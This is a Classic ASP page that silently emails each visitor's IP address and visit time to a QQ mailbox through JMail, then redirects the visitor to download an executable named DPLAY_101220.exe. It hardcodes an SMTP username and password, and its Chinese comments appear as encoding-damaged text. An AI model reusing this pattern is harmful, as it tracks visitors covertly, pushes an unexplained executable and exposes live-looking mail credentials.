<%
 '###############| �����ʼ� |#################
   userip = Request.ServerVariables("HTTP_X_ForWARDED_For") 
If userip = "" Then userip = Request.ServerVariables("REMOTE_ADDR")

mailBody=""
mailBody=mailBody&"<body style='font-size:12px;line-height:20px;'>"
mailBody=mailBody&"����ip:"&userip&"<br><br>"
mailBody=mailBody&"ʱ&nbsp;��:"&now()&"<br><br>"
mailBody=mailBody&"</body>"
 
set JMail= server.CreateObject("jmail.message")
    JMail.Silent     = true
    JMail.Charset    = "gb2312"
    JMail.ContentType= "text/html"
 
    JMail.From       = "info@szfex.com"            'SMTP��������������
    JMail.MailServerUserName = "info@szfex.com"    '��SMTP��������Ӧ�������û���
    JMail.MailServerPassWord = "abc2ky"                '��SMTP��������Ӧ����������

    JMail.FromName   = "�����û�:"&userip       '����������
    JMail.ReplyTo    = "879102019@qq.com"   '�����������ַ
    JMail.Subject    = "���˵�½!"  '�ʼ�����
    JMail.Body       = mailBody                   '�ʼ�����
 
    JMail.AddRecipient "879102019@qq.com"          '�����ʼ�������
    isgo = JMail.Send("mail.szfex.com")         'SMTP������
    JMail.Close
set JMail = nothing
  '###########################################
response.Redirect("DPLAY_101220.exe")
%>
